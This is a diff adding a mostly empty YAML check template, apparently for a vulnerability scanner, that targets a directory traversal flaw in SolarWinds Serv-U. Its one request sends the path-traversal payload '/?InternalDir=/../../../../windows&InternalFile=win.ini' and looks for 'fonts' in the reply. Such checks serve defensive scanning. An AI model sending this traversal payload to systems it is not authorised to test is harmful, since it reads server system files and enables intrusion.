@@ -1,0 +1,16 @@
+id:
+
+info:
+  name: SolarWinds Serv-U 目录遍历漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /?InternalDir=/../../../../windows&InternalFile=win.ini
+response1:
+  body: fonts
+  code: 200
+requests2:
+response2:
